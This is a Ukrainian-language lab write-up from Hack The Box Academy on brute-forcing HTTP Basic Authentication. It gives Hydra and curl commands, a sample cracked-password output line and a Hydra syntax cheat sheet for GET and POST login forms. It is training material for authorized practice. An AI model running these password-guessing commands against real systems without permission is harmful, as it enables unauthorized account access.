# Basic HTTP Authentication Brute Force (Hydra)

## Модуль
[Login Brute Forcing — Basic Auth Brute Forcing](https://academy.hackthebox.com/app/module/57/section/503)

## Концепція

**Basic HTTP Authentication** — браузер/клієнт надсилає `Authorization: Basic base64(user:pass)`.
Hydra підтримує це нативно через модуль `http-get`.

## Команди

```bash
# Крок 1 — завантажити wordlist
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# Крок 2 — Hydra брутфорс Basic Auth
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt \
  TARGET_IP http-get / -s TARGET_PORT

# Крок 3 — отримати флаг після знаходження пароля
curl -s -u "basic-auth-user:Password@123" http://TARGET_IP:TARGET_PORT/
```

## Результат
[32058][http-get] host: 154.57.164.77   login: basic-auth-user   password: Password@123

**Flag:** `HTB{th1s_1s_4_f4k3_fl4g}`

## Синтаксис Hydra для HTTP

```bash
# http-get — Basic Authentication або GET-форми
hydra -l USER -P WORDLIST TARGET_IP http-get /path -s PORT

# http-post-form — POST login форми
hydra -l USER -P WORDLIST TARGET_IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -s PORT

# Множинні юзери
hydra -L users.txt -P WORDLIST TARGET_IP http-get / -s PORT
```

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | `http-get /` — слеш обов'язковий, вказує на який шлях атакувати |
| 2 | `-s PORT` — вказує нестандартний порт |
| 3 | `-l` (lowercase) — один юзер, `-L` — файл з юзерами |
| 4 | `-p` — один пароль, `-P` — файл з паролями |
| 5 | Після знаходження — верифікація через `curl -u "user:pass"` |

## Wordlists для паролів (від меншого до більшого)

| Файл | Розмір | Використання |
|------|--------|-------------|
| `500-worst-passwords.txt` | 500 | Швидка перевірка |
| `2023-200_most_used_passwords.txt` | 200 | Сучасні поширені паролі |
| `rockyou.txt` | 14M | Повний перебір |

## Примітка — Kali vs Pwnbox

> Якщо Hydra на Kali не досягає таргету HTB Academy —
> використовуй **HTB Pwnbox** (Spawned Target термінал).
> Причина: мережева ізоляція між локальним Kali і Academy VPN.
> Рішення: підключитись через `openvpn academy.ovpn` або використати Pwnbox.
